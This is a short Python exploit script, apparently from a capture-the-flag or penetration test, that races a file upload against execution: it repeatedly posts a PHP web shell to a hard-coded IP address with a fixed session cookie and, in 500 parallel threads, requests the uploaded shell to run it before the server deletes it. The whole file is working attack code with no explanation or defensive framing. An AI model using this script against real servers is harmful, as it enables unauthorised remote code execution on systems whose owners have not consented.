import requests
import string
import sys
import threading

r = requests.session()

url = "http://62.84.114.238/"
cookie={ "PHPSESSID":"6c1df1166b66365e482a4841d920172e"}

def upload():
    files = {"data": open("shell.php", "rb")}
    res = r.post(url, files=files,data={"data":"taidh"},cookies=cookie)
    print(res.text)

def excute_php():
    a = r.get(url+"upload/cf8828cf95abdb5e046d30e4f6006588/shell.php")
    print(a.text)


if __name__ == "__main__":
    for i in range(1,500):
        t = threading.Thread(target = upload)
        t1 = threading.Thread(target = excute_php)

        t.start()
        t1.start()